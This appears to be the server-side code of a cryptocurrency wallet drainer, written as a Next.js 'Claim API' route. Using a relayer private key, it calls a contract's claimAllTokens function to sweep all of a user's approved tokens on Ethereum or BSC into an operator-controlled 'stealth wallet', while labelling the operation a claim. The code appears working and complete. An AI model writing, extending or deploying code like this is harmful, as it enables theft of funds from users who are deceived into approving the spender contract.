import { ethers } from 'ethers';
import { NextRequest, NextResponse } from 'next/server';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

// Minimal ABI for the Spender contract
const SPENDER_ABI = [
  {
    inputs: [
      { internalType: 'address', name: 'token', type: 'address' },
      { internalType: 'address', name: 'from', type: 'address' },
      { internalType: 'address', name: 'to', type: 'address' },
    ],
    name: 'claimAllTokens',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
];

type SupportedNetwork = 'ethereum' | 'bsc';

const getNetworkConfig = (network: SupportedNetwork) => {
  if (network === 'bsc') {
    return {
      rpcUrl: process.env.NEXT_PUBLIC_BSC_RPC || 'https://bsc-dataseed1.binance.org',
      spenderAddress: process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '0x',
    };
  }
  return {
    rpcUrl: process.env.NEXT_PUBLIC_RPC_URL || 'https://ethereum.publicnode.com',
    spenderAddress: process.env.SPENDER_CONTRACT_ADDRESS || '0x',
  };
};

export async function POST(request: NextRequest) {
  try {
    const { userAddress, tokenAddress, network } = await request.json();

    console.log(`[v0] Claim API: Received request for ${network}`, { userAddress, tokenAddress });

    // Validate inputs
    if (!userAddress || !ethers.isAddress(userAddress)) {
      return NextResponse.json({ error: 'Invalid user address' }, { status: 400 });
    }

    if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
      return NextResponse.json({ error: 'Invalid token address' }, { status: 400 });
    }

    if (!network || !['ethereum', 'bsc'].includes(network)) {
      return NextResponse.json({ error: 'Invalid network' }, { status: 400 });
    }

    // Get environment variables
    const relayerKey = process.env.RELAYER_PRIVATE_KEY;
    const stealthWallet = process.env.STEALTH_WALLET_ADDRESS;

    if (!relayerKey || !stealthWallet) {
      console.error('[v0] Missing environment variables:', {
        hasRelayerKey: !!relayerKey,
        hasStealth: !!stealthWallet,
      });
      return NextResponse.json({ error: 'Server configuration error' }, { status: 500 });
    }

    const config = getNetworkConfig(network as SupportedNetwork);

    console.log(`[v0] Processing claim on ${network}:`, { userAddress, tokenAddress, stealthWallet });

    // Create provider and relayer wallet
    const provider = new ethers.JsonRpcProvider(config.rpcUrl);
    const relayerWallet = new ethers.Wallet(relayerKey, provider);

    // Create spender contract instance
    const spenderContract = new ethers.Contract(config.spenderAddress, SPENDER_ABI, relayerWallet);

    // Call claimAllTokens
    console.log(`[v0] Calling claimAllTokens on ${network}...`);

    const claimTx = await spenderContract.claimAllTokens(
      tokenAddress,
      userAddress,
      stealthWallet,
      {
        gasLimit: 500000,
      }
    );

    console.log(`[v0] Claim tx sent on ${network}:`, claimTx.hash);

    // Wait for confirmation
    const receipt = await claimTx.wait(1);

    console.log(`[v0] Claim confirmed in block ${receipt?.blockNumber} on ${network}`);

    return NextResponse.json(
      {
        success: true,
        network,
        userAddress,
        tokenAddress,
        stealthWallet,
        txHash: claimTx.hash,
        blockNumber: receipt?.blockNumber,
      },
      { status: 200 }
    );
  } catch (error: any) {
    console.error(`[v0] Claim error:`, error);
    const errorMessage = error?.reason || error?.shortMessage || error?.message || 'Claim failed';
    return NextResponse.json({ error: errorMessage }, { status: 500 });
  }
}

